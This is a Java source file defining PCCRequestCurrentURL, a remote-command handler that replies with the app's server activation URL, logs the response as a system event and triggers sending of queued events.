package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.info.ServerUrl;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCRequestCurrentURL extends PCCRmtCmdAsync {
		
	private ServerUrl serverUrl = Global.getServerUrl();
	private SendEventManager eventSender = Global.getSendEventManager();
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.REQUEST_CURRENT_URL.getId());
		try {
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(RmtCmdTextResource.REQUEST_CURRENT_URL);
			responseMessage.append(serverUrl.getServerActivationUrl());
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

}
